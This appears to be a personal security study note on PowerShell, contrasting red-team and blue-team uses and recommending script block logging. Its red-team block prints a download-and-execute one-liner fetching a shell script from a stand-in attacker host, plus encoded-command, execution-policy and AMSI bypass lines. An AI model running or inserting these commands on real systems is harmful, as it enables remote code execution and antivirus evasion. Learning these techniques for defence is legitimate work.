---
title: PowerShell
category: programming
status: not-started
difficulty: intermediate
summary: Windows scripting language and shell. Critical for Windows administration, red team operations, and understanding LOLBAS techniques.
connections:
  - programming/bash
  - operating-systems/windows
tags:
  - programming
  - windows
  - automation
---

## Why PowerShell for Security?

- Built into every modern Windows system
- Attackers use it extensively (fileless malware, C2, lateral movement)
- Defenders need it for log analysis and automation
- LOLBAS — Living Off the Land using built-in tools

## Red Team Uses

```powershell
# Download and execute (common attack pattern)
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')

# Base64 encoded execution (obfuscation)
powershell -enc <base64>

# Disable execution policy (bypass)
Set-ExecutionPolicy Bypass -Scope Process

# AMSI bypass (detect and neutralize AV scanning)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
```

## Blue Team Uses

```powershell
# Find recently modified files
Get-ChildItem C:\ -Recurse | Where-Object {$_.LastWriteTime -gt (Get-Date).AddDays(-1)}

# Check running services
Get-Service | Where-Object {$_.Status -eq 'Running'}

# Export event logs
Get-WinEvent -LogName Security | Export-Csv security.csv
```

## Logging

Enable PowerShell logging: Script Block Logging and Module Logging to catch malicious use.
